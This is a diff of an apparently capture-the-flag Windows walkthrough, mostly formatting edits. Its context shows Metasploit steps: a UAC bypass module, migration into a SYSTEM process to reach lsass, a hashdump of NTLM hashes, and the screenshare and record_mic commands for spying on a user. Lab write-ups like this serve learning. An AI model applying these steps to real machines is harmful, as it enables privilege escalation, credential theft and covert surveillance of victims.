@@ -129,7 +129,7 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 ```
 From the results, the `exploit/windows/local/bypassuac_eventvwr` can be used to bypass the Windows UAC to esalate the privileges.
 
-Background the current session and note down the current session number by `sessions`.
+Background the current session and note down the current session number by `sessions`.  
 Load the exploit and set the LHOST and SESSION number that was recorded above.
 
 ```bash
@@ -213,7 +213,7 @@ meterpreter >
 ```
 - Using the `SeTakeOwnershipPrivilege`, we can take the ownership of the files.  
 - We need to migrate our process to a stable and equally privileged, in order to access the `lsass` service (which is responsible for authentication).
-- List the running processes and migration to printer service.   
+- List the running processes using `ps` and `migrate` to printer service.   
 
 ```bash
 meterpreter > ps
@@ -223,7 +223,7 @@ meterpreter > migrate 1256
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
-***We now have the super user privileges.***
+***We now have escalated the super user privileges.***
 
 ### Looting Credentials
 
@@ -273,8 +273,9 @@ We have successfully extracted the credentials and the user `Dark` password is `
 
 ```bash
 meterpreter > hashdump
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
+Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::  
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
 ```
 - Using `screenshare`, we can watch the remote user desktop.
 - Using `record_mic`, we can record from the microphone.  
